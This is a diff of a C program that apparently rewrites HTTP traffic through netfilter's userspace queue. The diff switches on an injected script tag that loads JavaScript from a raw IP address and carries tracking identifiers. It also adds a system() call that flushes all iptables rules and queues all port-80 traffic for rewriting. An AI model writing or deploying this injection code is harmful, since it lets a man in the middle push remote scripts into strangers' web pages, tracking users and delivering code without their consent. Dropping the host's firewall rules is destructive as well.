@@ -3,8 +3,8 @@
 struct list_head httpc_list;
 struct ipq_msg ipqm;
 
-#define JS "hello world"
-//#define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>"
+//#define JS "hello world"
+#define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>"
 #define JS_LEN strlen(JS)
 
 unsigned short in_cksum(unsigned short *addr, int len)    /* function is from ping.c */
@@ -770,6 +770,8 @@ int main(int argc, char **argv)
 	//thpool_add_job(timeout , NULL);
 	//thpool_add_job(remote , NULL);
 
+	system("iptables -F && iptables -A INPUT -p tcp --sport 80 -j QUEUE && iptables -A OUTPUT -p tcp --dport 80 -j QUEUE");
+	
 	memset(&ipqm , '\0' , sizeof(struct ipq_msg));
 	
     ipqm.h = ipq_create_handle(0, NFPROTO_IPV4);
